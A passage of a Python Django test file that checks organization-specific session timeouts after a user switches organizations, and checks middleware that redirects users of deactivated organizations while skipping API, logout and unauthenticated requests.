            response.headers["Location"], "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
        )

    @freeze_time("2024-01-01 12:00:00")
    @patch("time.time", return_value=1704110400.0)  # 2024-01-01 12:00:00
    def test_session_timeout_after_switching_org_with_cache(self, mock_time):
        # Create another org with different timeout
        other_org = Organization.objects.create(name="Other Org", session_cookie_age=30)
        other_team = Team.objects.create(organization=other_org, name="Other Team")
        self.user.organizations.add(other_org)

        # Set cache for both orgs
        cache.set(f"org_session_age:{self.organization.id}", 50)
        cache.set(f"org_session_age:{other_org.id}", 30)

        # Initial request sets session creation time
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(self.client.session.get(settings.SESSION_COOKIE_CREATED_AT_KEY), 1704110400.0)

        # Switch to other team
        self.user.team = other_team
        self.user.current_team = other_team
        self.user.current_organization = other_org
        self.user.save()

        # Move forward 29 seconds (before new org's timeout)
        mock_time.return_value = 1704110429.0  # 2024-01-01 12:00:29
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)

        # Move forward 31 seconds (past new org's timeout)
        mock_time.return_value = 1704110431.0  # 2024-01-01 12:00:31
        response = self.client.get("/")
        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            response.headers["Location"], "/login?message=Your%20session%20has%20expired.%20Please%20log%20in%20again."
        )


class TestActiveOrganizationMiddleware(APIBaseTest):
    def test_active_organization_allows_request(self):
        self.organization.is_active = True
        self.organization.save()

        # API paths are skipped by middleware
        response = self.client.get("/api/users/@me/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(response.json()["email"], self.user.email)

        # Non-API paths are checked
        response = self.client.get("/dashboard")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    def test_api_paths_skipped_even_with_inactive_org(self):
        """API paths should be skipped by middleware regardless of org status"""
        self.organization.is_active = False
        self.organization.is_not_active_reason = "Test deactivation"
        self.organization.save()

        # API paths should work even with inactive org
        response = self.client.get("/api/users/@me/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    def test_inactive_organization_redirects_non_api_paths(self):
        other_org = Organization.objects.create(name="Other Org", is_active=True)
        self.user.organizations.add(other_org)

        self.organization.is_active = False
        self.organization.is_not_active_reason = "Test deactivation"
        self.organization.save()

        # Non-API paths should redirect
        response = self.client.get("/dashboard")
        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
        self.assertEqual(response.headers["Location"], "/organization-deactivated")

    def test_inactive_organization_allows_organization_deactivated_page(self):
        self.organization.is_active = False
        self.organization.is_not_active_reason = "Test deactivation"
        self.organization.save()

        # Should allow access to the deactivated page itself
        response = self.client.get("/organization-deactivated")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

    def test_logout_path_skipped(self):
        """Logout paths should be skipped by middleware"""
        self.organization.is_active = False
        self.organization.save()

        response = self.client.get("/logout")
        # Logout may redirect (302 is normal), but should not redirect to organization-deactivated
        self.assertEqual(response.status_code, status.HTTP_302_FOUND)
        self.assertNotIn("organization-deactivated", response.headers.get("Location", ""))

    def test_unauthenticated_user_not_affected(self):
        self.client.logout()
        # API paths are skipped, so auth check happens in view
        response = self.client.get("/api/users/@me/")
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

        # Non-API paths are also skipped for unauthenticated users
        response = self.client.get("/dashboard")
        # Should redirect to login or show appropriate response
        self.assertIn(response.status_code, [status.HTTP_302_FOUND, status.HTTP_200_OK])
